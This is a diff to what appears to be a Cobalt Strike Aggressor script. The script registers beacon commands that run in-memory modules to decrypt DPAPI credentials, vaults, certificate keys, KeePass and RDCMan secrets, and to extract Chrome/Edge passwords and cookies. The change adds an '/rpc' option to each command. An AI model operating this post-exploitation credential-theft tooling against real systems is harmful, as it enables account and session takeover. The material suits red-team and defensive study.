@@ -83,13 +83,14 @@ alias credentials {
     %args = _parse_args(substr($0, 12));
 
     $data = _load_bof("credentials");
-    $args = bof_pack($bid, "zzzzzz",
+    $args = bof_pack($bid, "zzzzzzi",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["password"]),
         _str_or_empty(%args["ntlm"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["target"]),
-        _str_or_empty(%args["server"])
+        _str_or_empty(%args["server"]),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -97,7 +98,7 @@ alias credentials {
 beacon_command_register(
     "credentials",
     "Triage user DPAPI credential files",
-    "Usage: credentials [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC]"
+    "Usage: credentials [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/rpc]"
 );
 
 # ============================================================
@@ -109,13 +110,14 @@ alias vaults {
     %args = _parse_args(substr($0, 7));
 
     $data = _load_bof("vaults");
-    $args = bof_pack($bid, "zzzzzz",
+    $args = bof_pack($bid, "zzzzzzi",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["password"]),
         _str_or_empty(%args["ntlm"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["target"]),
-        _str_or_empty(%args["server"])
+        _str_or_empty(%args["server"]),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -123,7 +125,7 @@ alias vaults {
 beacon_command_register(
     "vaults",
     "Triage user DPAPI vault files",
-    "Usage: vaults [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC]"
+    "Usage: vaults [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/rpc]"
 );
 
 # ============================================================
@@ -135,10 +137,11 @@ alias blob {
     %args = _parse_args(substr($0, 5));
 
     $data = _load_bof("blob");
-    $args = bof_pack($bid, "zzi",
+    $args = bof_pack($bid, "zzii",
         _str_or_empty(%args["target"]),
         _str_or_empty(%args["credkey"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -146,7 +149,7 @@ alias blob {
 beacon_command_register(
     "blob",
     "Describe/decrypt a raw DPAPI blob",
-    "Usage: blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]"
+    "Usage: blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect] [/rpc]"
 );
 
 # ============================================================
@@ -180,7 +183,7 @@ alias certificates {
     %args = _parse_args(substr($0, 13));
 
     $data = _load_bof("certificates");
-    $args = bof_pack($bid, "zzzzzzii",
+    $args = bof_pack($bid, "zzzzzziii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["password"]),
         _str_or_empty(%args["ntlm"]),
@@ -188,7 +191,8 @@ alias certificates {
         _str_or_empty(%args["target"]),
         _str_or_empty(%args["server"]),
         iff(%args["showall"] eq "1", 1, 0),
-        iff(%args["machine"] eq "1", 1, 0)
+        iff(%args["machine"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -196,7 +200,7 @@ alias certificates {
 beacon_command_register(
     "certificates",
     "Triage DPAPI certificate private keys",
-    "Usage: certificates [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/showall] [/machine]"
+    "Usage: certificates [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/showall] [/machine] [/rpc]"
 );
 
 # ============================================================
@@ -208,14 +212,15 @@ alias rdg {
     %args = _parse_args(substr($0, 4));
 
     $data = _load_bof("rdg");
-    $args = bof_pack($bid, "zzzzzzi",
+    $args = bof_pack($bid, "zzzzzzii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["password"]),
         _str_or_empty(%args["ntlm"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["target"]),
         _str_or_empty(%args["server"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -223,7 +228,7 @@ alias rdg {
 beacon_command_register(
     "rdg",
     "Triage RDG/RDCMan saved credentials",
-    "Usage: rdg [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/unprotect]"
+    "Usage: rdg [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/server:DC] [/unprotect] [/rpc]"
 );
 
 # ============================================================
@@ -235,13 +240,14 @@ alias keepass {
     %args = _parse_args(substr($0, 7));
 
     $data = _load_bof("keepass");
-    $args = bof_pack($bid, "zzzzzi",
+    $args = bof_pack($bid, "zzzzzii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["password"]),
         _str_or_empty(%args["ntlm"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["target"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -249,7 +255,7 @@ alias keepass {
 beacon_command_register(
     "keepass",
     "Triage KeePass master key files",
-    "Usage: keepass [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/unprotect]"
+    "Usage: keepass [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/target:PATH] [/unprotect] [/rpc]"
 );
 
 # ============================================================
@@ -261,11 +267,12 @@ alias ps {
     %args = _parse_args(substr($0, 3));
 
     $data = _load_bof("ps");
-    $args = bof_pack($bid, "zzzi",
+    $args = bof_pack($bid, "zzzii",
         _str_or_empty(%args["target"]),
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["credkey"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -273,7 +280,7 @@ alias ps {
 beacon_command_register(
     "ps",
     "Decrypt PowerShell PSCredential / SecureString files",
-    "Usage: ps /target:FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect]"
+    "Usage: ps /target:FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect] [/rpc]"
 );
 
 # ============================================================
@@ -308,13 +315,14 @@ alias triage {
     %args = _parse_args(substr($0, 7));
 
     $data = _load_bof("triage_bof");
-    $args = bof_pack($bid, "zzzzzi",
+    $args = bof_pack($bid, "zzzzzii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["password"]),
         _str_or_empty(%args["ntlm"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["server"]),
-        iff(%args["showall"] eq "1", 1, 0)
+        iff(%args["showall"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -322,7 +330,7 @@ alias triage {
 beacon_command_register(
     "triage",
     "Full user DPAPI triage (masterkeys + creds + vaults + certs)",
-    "Usage: triage [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/server:DC] [/showall]"
+    "Usage: triage [/pvk:BASE64] [/password:PASS] [/ntlm:HASH] [/credkey:KEY] [/server:DC] [/showall] [/rpc]"
 );
 
 # ============================================================
@@ -380,13 +388,14 @@ alias chrome_logins {
     %args = _parse_args(substr($0, 14));
 
     $data = _load_bof("chrome_logins");
-    $args = bof_pack($bid, "zzzzzi",
+    $args = bof_pack($bid, "zzzzzii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["server"]),
         _str_or_empty(%args["target"]),
         _str_or_empty(%args["statekey"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -394,7 +403,7 @@ alias chrome_logins {
 beacon_command_register(
     "chrome_logins",
     "Extract Chrome/Edge saved passwords",
-    "Usage: chrome_logins [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/statekey:HEX] [/unprotect]"
+    "Usage: chrome_logins [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/statekey:HEX] [/unprotect] [/rpc]"
 );
 
 alias chrome_cookies {
@@ -403,7 +412,7 @@ alias chrome_cookies {
     %args = _parse_args(substr($0, 15));
 
     $data = _load_bof("chrome_cookies");
-    $args = bof_pack($bid, "zzzzzzzi",
+    $args = bof_pack($bid, "zzzzzzzii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["server"]),
@@ -411,7 +420,8 @@ alias chrome_cookies {
         _str_or_empty(%args["statekey"]),
         _str_or_empty(%args["cookie"]),
         _str_or_empty(%args["url"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -419,7 +429,7 @@ alias chrome_cookies {
 beacon_command_register(
     "chrome_cookies",
     "Extract Chrome/Edge cookies",
-    "Usage: chrome_cookies [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/statekey:HEX] [/cookie:REGEX] [/url:REGEX] [/unprotect]"
+    "Usage: chrome_cookies [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/statekey:HEX] [/cookie:REGEX] [/url:REGEX] [/unprotect] [/rpc]"
 );
 
 alias chrome_statekeys {
@@ -428,12 +438,13 @@ alias chrome_statekeys {
     %args = _parse_args(substr($0, 17));
 
     $data = _load_bof("chrome_statekeys");
-    $args = bof_pack($bid, "zzzzi",
+    $args = bof_pack($bid, "zzzzii",
         _str_or_empty(%args["pvk"]),
         _str_or_empty(%args["credkey"]),
         _str_or_empty(%args["server"]),
         _str_or_empty(%args["target"]),
-        iff(%args["unprotect"] eq "1", 1, 0)
+        iff(%args["unprotect"] eq "1", 1, 0),
+        iff(%args["rpc"] eq "1", 1, 0)
     );
     beacon_inline_execute($bid, $data, "go", $args);
 }
@@ -441,5 +452,5 @@ alias chrome_statekeys {
 beacon_command_register(
     "chrome_statekeys",
     "Extract Chrome/Edge Local State AES keys",
-    "Usage: chrome_statekeys [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/unprotect]"
+    "Usage: chrome_statekeys [/pvk:BASE64] [/credkey:KEY] [/server:DC] [/target:PATH] [/unprotect] [/rpc]"
 );
